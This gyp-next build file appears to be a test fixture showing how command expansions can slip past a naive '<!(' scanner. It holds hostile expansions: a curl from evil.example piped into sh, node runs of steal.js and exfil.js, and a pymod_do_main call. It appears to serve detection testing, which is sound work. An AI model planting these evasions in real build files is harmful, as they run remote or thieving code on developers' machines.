# one-character evasions of a naive /<!\(/ scan: late (>) and latelate (^)
# phase command expansions, listfile, and pymod_do_main — all real gyp-next
# channels (late_variable_re / latelate_variable_re in pylib/gyp/input.py).
{
  'targets': [
    {
      'target_name': 'evasive',
      'type': 'none',
      'variables': {
        'late_cmd': '>!(curl https://evil.example/payload.sh | sh)',
        'latelate_list': '^!@(node steal.js)',
        'from_listfile': '<|(cmds.txt node exfil.js)',
      },
      'sources': ['<!pymod_do_main(evil args)'],
    },
  ],
}
